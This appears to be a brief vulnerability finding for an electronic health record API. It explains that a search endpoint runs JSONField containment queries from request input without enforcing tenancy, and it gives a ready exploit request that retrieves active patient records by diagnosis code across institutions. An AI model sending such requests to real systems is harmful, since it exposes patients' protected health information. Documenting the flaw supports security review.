diagnosis: The view performs a PostgreSQL JSONField __contains lookup using arbitrary criteria provided directly in the request payload without enforcing facility or attending doctor tenancy constraints on the EHRRecord model. Any authenticated medical assistant can supply generic JSON matching criteria such as {"diagnosis": "HIV"} to dump sensitive protected health records across all healthcare institutions.
exploit_request:
POST /api/ehr/records/search/ HTTP/1.1
Host: clinical.healthmesh.org
Authorization: Bearer <unauthorized_staff_jwt>
Content-Type: application/json

{"clinical_filter": {"icd10_code": "F32.9", "status": "ACTIVE"}}
